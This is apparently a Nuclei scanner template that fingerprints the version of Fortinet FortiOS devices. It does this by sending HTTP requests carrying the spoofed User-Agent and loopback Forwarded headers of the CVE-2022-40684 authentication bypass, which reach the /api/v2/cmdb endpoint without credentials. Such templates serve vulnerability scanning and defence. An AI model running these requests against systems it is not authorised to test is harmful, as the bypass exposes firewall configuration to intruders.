id: fortinet

info:
  name: View Fortinet version
  author: UnD3sc0n0c1d0
  severity: info
  reference: |
    - https://www.fortiguard.com/psirt/FG-IR-22-377
    - https://www.horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684/
    - https://github.com/horizon3ai/CVE-2022-40684
    - https://github.com/NagliNagli/BountyTricks/blob/main/CVE-2022-40684.yaml
  tags: fortinet,fortios,fortigates

requests:
  - raw:
    - |+
        TRACE / HTTP/2
        Host: {{Hostname}}
        
    - |+
        OPTIONS /api/v2/cmdb HTTP/2
        Host: {{Hostname}}
        User-Agent: Node.js
        Forwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;

    - |+
        GET /api/v2/cmdb HTTP/2
        Host: {{Hostname}}
        User-Agent: Report Runner
        Forwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;

    stop-at-first-match: true
    matchers-condition: and
    matchers:
          - type: status
            part: header
            status:
              - 405

          - type: word
            words:
              - 'serial'
            part: body

    extractors:
          - type: json
            part: body
            name: version
            json:
              - '.["version"]'
